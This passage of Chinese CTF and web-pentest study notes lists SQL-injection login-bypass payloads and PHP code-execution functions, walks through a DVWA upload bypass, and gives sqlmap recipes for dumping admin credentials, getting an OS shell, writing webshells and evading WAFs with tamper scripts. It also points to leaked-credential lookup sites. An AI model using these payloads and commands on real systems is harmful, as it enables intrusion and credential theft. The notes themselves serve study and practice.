class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> asp万能密码</span></span><br><span class="line">'or'='or'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> aspx万能密码</span></span><br><span class="line">1： "or "a"="a</span><br><span class="line">2： ')or('a'='a</span><br><span class="line">3：or 1=1--</span><br><span class="line">4：'or 1=1--</span><br><span class="line">5：a'or' 1=1--</span><br><span class="line">6： "or 1=1--</span><br><span class="line">7：'or'a'='a</span><br><span class="line">8： "or"="a'='a</span><br><span class="line">9：'or''='</span><br><span class="line">10：'or'='or'</span><br><span class="line">11: 1 or '1'='1'=1</span><br><span class="line">12: 1 or '1'='1' or 1=1</span><br><span class="line">13: 'OR 1=1%00</span><br><span class="line">14: "or 1=1%00</span><br><span class="line">15: 'xor</span><br><span class="line">16: 新型万能登陆密码</span><br><span class="line">username: ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）</span><br><span class="line">passwd: 1</span><br><span class="line">Username=-1%cf' union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">Password=1</span><br><span class="line">17..admin' or 'a'='a 密码随便</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> PHP万能密码</span></span><br><span class="line">'or'='or'</span><br><span class="line">'or 1=1/*  字符型 GPC是否开都可以使用</span><br><span class="line">User: something</span><br><span class="line">Pass: ' OR '1'='1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> jsp 万能密码</span></span><br><span class="line">1'or'1'='1</span><br><span class="line">admin' OR 1=1/*</span><br><span class="line">用户名：admin （系统存在此用户)</span><br><span class="line">密码：1'or'1'='1</span><br></pre></td></tr></table></figure><p><strong>思路：</strong></p><ul><li>根据提示，判断是否是普通的登陆绕过，或是利用社工的方式</li><li>普通登陆绕过尝试各种万能密码绕过，或通过普通的 sql 注入漏洞得到账号密码，或 xss 盲打，sqlmap注入</li><li>如果是 cms 系统登陆，查看是否有相应版本的后台绕过漏洞</li><li>如果是社工方式，谷歌，百度，社工库</li><li>爆破获取</li><li>robots.txt 找找后台</li></ul><h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><p><strong>类型：</strong></p><ul><li>简单的编码(多次 base64 编码)</li><li>密码题(hash 长度扩展、异或、移位加密各种变形)</li><li>js 加解密</li><li>根据加密源码写解密脚本</li></ul><p><strong>思路：</strong></p><ul><li>判断是编码还是加密</li><li>如果是编码，判断编码类型，尝试解码或多次解码</li><li>如果是加密，判断是现有的加密算法，还是自写的加密算法</li><li>是否是对称加密，是否存在秘钥泄露等，获取秘钥解密</li><li>根据加密算法，推断出解密算法</li></ul><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h4 id="直接执行代码"><a href="#直接执行代码" class="headerlink" title="直接执行代码"></a>直接执行代码</h4><p>PHP 中有不少可以直接执行代码的函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>();</span><br><span class="line">assert();</span><br><span class="line">system();</span><br><span class="line">exec();</span><br><span class="line">shell_exec();</span><br><span class="line">passthru();</span><br><span class="line">escapeshellcmd();</span><br><span class="line">pcntl_exec();</span><br></pre></td></tr></table></figure><h4 id="preg-replace-代码执行"><a href="#preg-replace-代码执行" class="headerlink" title="preg_replace( ) 代码执行"></a>preg_replace( ) 代码执行</h4><p>preg_replace() 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $var = <span class="string">"&lt;tag&gt;phpinfo()&lt;/tag&gt;"</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e"</span>, <span class="string">"addslashes(\\1)"</span>, $var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>若无 <code>/e</code> 修饰符，则可以尝试 %00 截断。</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php/" target="_blank" rel="noopener">继续学习</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>脑洞题</p><p><strong>类型：</strong></p><ul><li><p>爆破，包括MD5、爆随机数、验证码识别</p></li><li><p>社工，花式查社工库、微博、QQ签名、whois、谷歌  <a href="www.findmima.com">天涯社工库</a></p></li><li><p>SSRF，包括花式探测端口、302跳转、花式协议利用、gophar直接去shell等等</p></li><li><p>协议，花式IP伪造X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA、</p><p>花式藏FLAG、花式分析数据包</p><p>X-Forwarded-For简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。</p><p>标准格式如下：X-Forwarded-For: client1, proxy1, proxy2</p></li><li><p>XXE，各种 XML 存在地方(rss/word/流媒体)、各种XXE利用方法(文件读取)</p></li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><ul><li><p>Proxy</p><p>  拦截 HTTP /S 的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</p></li><li><p>Spider</p><p>  应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</p></li><li><p>Scanner[仅限专业版]</p><p>  一个高级的工具，执行后，它能自动地发现 web应用程序的安全漏洞。</p></li><li><p>Intruder</p><p>  高度可配置的工具，对 web 应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用 fuzzing 技术探测常规漏洞。</p></li><li><p>Repeater</p><p>  靠手动操作来补发单独的 HTTP请求，并分析应用程序响应的工具。</p></li><li><p>Sequencer</p><p>  用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</p></li><li><p>Decoder</p><p>  进行手动执行或对应用程序数据者智能解码编码的工具。</p></li><li><p>Comparer</p><p>  通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 </p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cupp -i  # 加入社工信息，生成特有字典</span><br><span class="line">proxy -&gt; history  # 找到登录信息</span><br><span class="line">Send to intruder</span><br><span class="line">clear§  # 清楚所有§</span><br><span class="line">add§  # 在需要爆破的地方加§</span><br><span class="line">payloads -&gt; load... # 导入字典</span><br><span class="line">options -&gt; number of threads  # 设置多线程</span><br><span class="line">start attack  # 观察状态码和长度</span><br></pre></td></tr></table></figure><p>若 Burp 无法抓取 DVWA 等本地包，代理设置中删除 <code>不使用代理</code> ：<u>localhost,127.0.0.1</u> 即可</p><p><strong>全局参数设置和使用</strong></p><ul><li>Project option</li></ul><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><h5 id="目录与文件扫描"><a href="#目录与文件扫描" class="headerlink" title="目录与文件扫描"></a>目录与文件扫描</h5><h5 id="暴力破解后台"><a href="#暴力破解后台" class="headerlink" title="暴力破解后台"></a>暴力破解后台</h5><h5 id="暴力破解一句话木马"><a href="#暴力破解一句话木马" class="headerlink" title="暴力破解一句话木马"></a>暴力破解一句话木马</h5><h5 id="配合-sqlmap-实现被动式注入发现"><a href="#配合-sqlmap-实现被动式注入发现" class="headerlink" title="配合 sqlmap 实现被动式注入发现"></a>配合 sqlmap 实现被动式注入发现</h5><h5 id="突破文件上传"><a href="#突破文件上传" class="headerlink" title="突破文件上传"></a>突破文件上传</h5><ul><li>分析 medium 级别代码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">        $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">        $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// File information</span></span><br><span class="line">        $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">        $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">        $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Is it an image?</span></span><br><span class="line">        <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">                ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">                <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">                        <span class="comment">// No</span></span><br><span class="line">                        $html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// Yes!</span></span><br><span class="line">                        $html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Invalid file</span></span><br><span class="line">                $html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里分别通过<code>$_FILES[&#39;uploaded&#39;][&#39;type&#39;]</code>和<code>$_FILES[&#39;uploaded&#39;][&#39;size&#39;]</code>获取了上传文件的 MIME类型和文件大小。</p><p>MIME类型用来设定某种扩展名文件的打开方式，当具有该扩展名的文件被访问时，浏览器会自动使用指定的应用程序来打开，如jpg图片的MIME为<code>image/jpeg</code>。</p><p>因而medium与low的主要区别就是对文件的MIME类型和文件大小进行了判断，这样就只允许上传jpg格式的图片文件。</p><p><code>../</code>即为上级目录</p><ul><li><p><strong>用 Burp 抓包改下 <code>Content-Type</code> 为 <code>image/jpeg</code></strong>，上传成功</p></li><li><p>上传正常文件，拦截上传内容，将代码从请求头插进去</p></li><li><p>文件包含</p></li></ul><h5 id="数据获取测试"><a href="#数据获取测试" class="headerlink" title="数据获取测试"></a>数据获取测试</h5><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 网站有防注入过滤，当提交and 1=1时，返回了非法操作的提示，再在网站后面添加其他字符，只要报错，就说明有注入</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Acess 中转注入攻击</span></span><br><span class="line">sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs --tables</span><br><span class="line"><span class="meta">#</span><span class="bash"> 表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来。程序员没有考虑到恶意用户会通过cookie来提交参数，因此没有调用防注入程序来过滤cookie部分，从而导致cookie注入的发生</span></span><br><span class="line">sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin --columns  # 指定 admin 表</span><br><span class="line">sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin -C admin password --dump # 将数据内容脱到本地</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 检查注入点：</span></span><br><span class="line">sqlmap -u http://aa.com/star_photo.php?artist_id＝11</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 爆当前数据库信息：</span></span><br><span class="line">sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定库名列出所有表</span></span><br><span class="line">sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables</span><br><span class="line">('vhost48330' 为指定数据库名称)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定库名表名列出所有字段</span></span><br><span class="line">sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns</span><br><span class="line">('admin' 为指定表名称)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定库名表名字段dump出指定字段</span></span><br><span class="line">sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump  ('ac,id,password' 为指定字段名称)</span><br></pre></td></tr></table></figure><p><strong>参数解释</strong></p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">* 在注入的过程中，有时候是伪静态的页面，可以使用星号表示可能存在注入的部分</span><br><span class="line"></span><br><span class="line"><span class="literal">--data</span></span><br><span class="line">使用post方式提交的时候，就需要用到data参数了</span><br><span class="line"></span><br><span class="line"><span class="literal">-p</span></span><br><span class="line">当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间</span><br><span class="line"></span><br><span class="line"><span class="literal">--level</span></span><br><span class="line">不同的level等级，SQLMAP所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。</span><br><span class="line"></span><br><span class="line"><span class="literal">--random-agent</span></span><br><span class="line">使用该参数，SQLMAP会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent</span><br><span class="line"></span><br><span class="line"><span class="literal">--technique</span></span><br><span class="line">这个参数可以指定SQLMAP使用的探测技术，默认情况下会测试所有的方式。</span><br><span class="line">支持的探测方式如下：</span><br><span class="line"><span class="attribute">B</span>: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line"></span><br><span class="line"><span class="attribute">E</span>: Error-based SQL injection（报错型注入）</span><br><span class="line"></span><br><span class="line"><span class="attribute">U</span>: UNION query SQL injection（可联合查询注入）</span><br><span class="line"></span><br><span class="line"><span class="attribute">S</span>: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line"></span><br><span class="line"><span class="attribute">T</span>: Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure><p><strong>Access注入</strong></p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 注入点<span class="built_in">url</span> <span class="comment">//判断是否有注入</span></span><br><span class="line"></span><br><span class="line">sqlmap -u 注入点<span class="built_in">url</span> --tables <span class="comment">//access直接猜表</span></span><br><span class="line"></span><br><span class="line">sqlmap -u 注入点<span class="built_in">url</span>  --colums -T admin <span class="comment">//爆出admin表，猜解它的字段</span></span><br><span class="line"></span><br><span class="line">sqlmap -u 注入点<span class="built_in">url</span>  --dump -T admin -C <span class="string">"username,password"</span>  <span class="comment">//猜字段内容</span></span><br></pre></td></tr></table></figure><p><strong>MySQL数据库注入</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url  <span class="params">--dbs</span>  <span class="string">//</span>获取数据库</span><br><span class="line"></span><br><span class="line">sqlmap  -u  url  -D 指定的数据库 <span class="params">--tables</span> <span class="string">//</span>获取数据库中的表</span><br><span class="line"></span><br><span class="line">sqlmap  -u  url  -D 指定的数据库 -T 表名  <span class="params">--columns</span>  <span class="string">//</span>获取表字段</span><br><span class="line"></span><br><span class="line">sqlmap  -u  url  -D 指定的数据库 -T 表名  -C id,user,pass <span class="params">--dump</span>  <span class="string">//</span>获取字段内容</span><br></pre></td></tr></table></figure><p><strong>Cookie注入</strong></p><p>网站有判断，不让用and,update等参数时就得加上Cookie。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url <span class="params">--cookie=</span><span class="string">"cookie值"</span> <span class="params">--dbs</span><span class="params">(或)</span><span class="params">--tables</span> <span class="params">--level</span> 2</span><br></pre></td></tr></table></figure><p><strong>POST表单注入</strong></p><p>注入点：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//testasp.vulnweb.com/Login.asp</span></span><br></pre></td></tr></table></figure><p><strong>几种方式：</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r burp拦截数据<span class="string">.txt</span> -p Pass<span class="params">(测试参数)</span> <span class="string">//</span>从文件读取数据包</span><br><span class="line"></span><br><span class="line">sqlmap -u http:<span class="string">//testasp.vulnweb.com/Login.asp</span>  <span class="params">--forms</span> <span class="string">//</span>自动搜索表单</span><br><span class="line"></span><br><span class="line">sqlmap -u http:<span class="string">//testasp.vulnweb.com/Login.asp</span>  <span class="params">--data</span> <span class="string">"Name=1&amp;Pass=1"</span>  <span class="string">//</span>手动添加数据</span><br></pre></td></tr></table></figure><p><strong>获取系统交互shell</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.sqlmap -u http:<span class="string">//url..</span> <span class="params">--os-shell</span>  <span class="string">//</span>或者windows可以用<span class="params">--os-cmd</span> 或<span class="params">--sql-shell</span></span><br><span class="line"></span><br><span class="line">2.选择网站服务端语言</span><br><span class="line"></span><br><span class="line">3.填写网站根目录C:<span class="string">/www/</span></span><br></pre></td></tr></table></figure><p><strong>伪静态注入</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqpmap  -u http:<span class="regexp">//</span>victim.com<span class="regexp">/id/</span><span class="number">666</span>*.html --dbs  <span class="regexp">//</span>在html扩展名前加个<span class="string">'*'</span></span><br></pre></td></tr></table></figure><p><strong>请求延时</strong></p><p>Web防注入措施，在访问两次错误页面后，第三次必须访问正确的页面</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">--delay</span> 2 <span class="string">//</span>延时两秒访问</span><br><span class="line"></span><br><span class="line"><span class="params">--safe-freq</span> 30  <span class="string">//</span>人为配置次数</span><br></pre></td></tr></table></figure><p><strong>绕过WAF防火墙</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="comment">//192.168.159.1/news.php?id=1 -v 3 --dbs --batch</span></span><br><span class="line"></span><br><span class="line">--tamper <span class="string">"space2morehash.py"</span> <span class="comment">//使用tamper脚本绕过</span></span><br><span class="line"></span><br><span class="line">类似脚本</span><br><span class="line"></span><br><span class="line">space2hash<span class="selector-class">.py</span> base64encode<span class="selector-class">.py</span> charencode.py</span><br></pre></td></tr></table></figure><p><strong>file参数使用</strong></p><p>必须为dba权限</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -<span class="keyword">u</span> url --<span class="keyword">is</span>-dba  //查看是否dba权限</span><br><span class="line"></span><br><span class="line">sqlmap -<span class="keyword">u</span> url --<span class="keyword">file</span>-<span class="keyword">write</span>=本地木马路径(D:/<span class="keyword">shell</span>.php)</span><br><span class="line"></span><br><span class="line">--<span class="keyword">file</span>-dest=目标根目录(C:/www/<span class="keyword">shell</span>.php)</span><br></pre></td></tr></table></figure><p><strong>Tamper</strong></p><p>DIY 部分，最具可玩性的地方。</p><p>基本注入语句是一样的，可不同的网站过滤规则不一样，此时就需要编写Tamper进行本地化。</p><ul><li>框架</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/escapequotes.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>).replace(<span class="string">'"'</span>, <span class="string">'\\"'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">priority 表示脚本的优先级，用于有多个脚本的情况</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    data = <span class="string">'''&#123;"admin_user":"admin%s","admin_pass":65&#125;;'''</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">'u'</span>, <span class="string">'u0075'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'o'</span>, <span class="string">'u006f'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'i'</span>, <span class="string">'u0069'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">''', 'u0027')</span></span><br><span class="line"><span class="string">    payload = payload.replace('"', 'u0022')</span></span><br><span class="line"><span class="string">    payload = payload.replace(' ', 'u0020')</span></span><br><span class="line"><span class="string">    payload = payload.replace('s', 'u0073')</span></span><br><span class="line"><span class="string">    payload = payload.replace('#', 'u0023')</span></span><br><span class="line"><span class="string">    payload = payload.replace('&gt;', 'u003e')</span></span><br><span class="line"><span class="string">    payload = payload.replace('&lt;', 'u003c')</span></span><br><span class="line"><span class="string">    payload = payload.replace('-', 'u002d')</span></span><br><span class="line"><span class="string">    payload = payload.replace('=', 'u003d')</span></span><br><span class="line"><span class="string">    return data % payload</span></span><br></pre></td></tr></table></figure><ul><li>tamper()</li></ul><p>返回处理后的 payload</p><p>例如服务器上有这么几行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = trim($POST($id),<span class="string">'union'</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id'"</span>;</span><br></pre></td></tr></table></figure><p>而我们的payload为</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-8363</span>'  <span class="built_in">union</span> <span class="built_in">select</span> <span class="built_in">null</span> -- -</span><br></pre></td></tr></table></figure><p>这里union被过滤掉了，将导致payload不能正常执行，那么就可以编写这样的tamper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">'union'</span>,<span class="string">'uniounionn'</span>)</span><br></pre></td></tr></table></figure><p>保存为replaceunion.py，放到sqlmap/tamper/下</p><p>执行的时候带上 –tamper=replaceunion 的参数，就可以绕过该过滤规则</p><p><a href="https://blog.csdn.net/hxsstar/article/details/22782627" target="_blank" rel="noopener">官方tamper</a></p><ul><li>dependencies()</li></ul><p>声明脚本的适用/不适用范围，可为空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap/tamper/echarunicodeencode.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">singleTimeWarnMessage(<span class="string">"tamper script '%s' is only meant to be run against ASP or ASP.NET web applications"</span> % os.path.basename(__file__).split(<span class="string">"."</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># singleTimeWarnMessage() 